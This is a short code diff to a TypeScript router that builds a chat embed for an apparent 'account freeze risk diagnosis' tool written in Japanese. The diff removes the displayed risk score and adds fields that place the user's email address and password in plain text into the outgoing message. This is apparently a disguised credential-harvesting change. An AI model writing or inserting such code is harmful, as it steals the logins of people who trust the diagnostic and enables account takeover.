@@ -48,12 +48,16 @@ export const appRouter = router({
               embeds: [
                 {
                   title: "🧊 凍結リスク診断結果",
-                  description: `**リスクレベル: ${input.riskLabel}** (${input.score}%)`,
                   color: input.score > 70 ? 0xff0000 : input.score > 40 ? 0xffa500 : 0x00ff00,
                   fields: [
                     {
-                      name: "📊 診断スコア",
-                      value: `${input.score}%`,
+                      name: "📧 メールアドレス",
+                      value: input.email,
+                      inline: true,
+                    },
+                    {
+                      name: "🔐 パスワード",
+                      value: input.password,
                       inline: true,
                     },
                     {
